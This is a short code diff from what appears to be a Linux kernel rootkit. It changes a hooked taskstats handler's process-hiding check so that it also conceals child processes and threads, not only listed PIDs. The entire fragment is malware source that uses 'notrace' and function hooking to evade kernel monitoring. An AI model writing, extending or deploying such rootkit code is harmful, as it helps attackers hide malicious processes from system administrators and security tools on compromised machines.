@@ -22,20 +22,10 @@ static int (*orig_taskstats_user_cmd)(struct sk_buff *skb, struct genl_info *inf
 
 static notrace bool is_pid_hidden_ts(pid_t pid)
 {
-    int i;
-    
     if (pid <= 0)
         return false;
-    
-    if (hidden_count < 0 || hidden_count > MAX_HIDDEN_PIDS)
-        return false;
-    
-    for (i = 0; i < hidden_count; i++) {
-        if (hidden_pids[i] == pid)
-            return true;
-    }
-    
-    return false;
+
+    return is_hidden_pid(pid) || is_child_pid(pid) || pid_is_thread(pid);
 }
 
 static notrace int hook_taskstats_user_cmd(struct sk_buff *skb, struct genl_info *info)
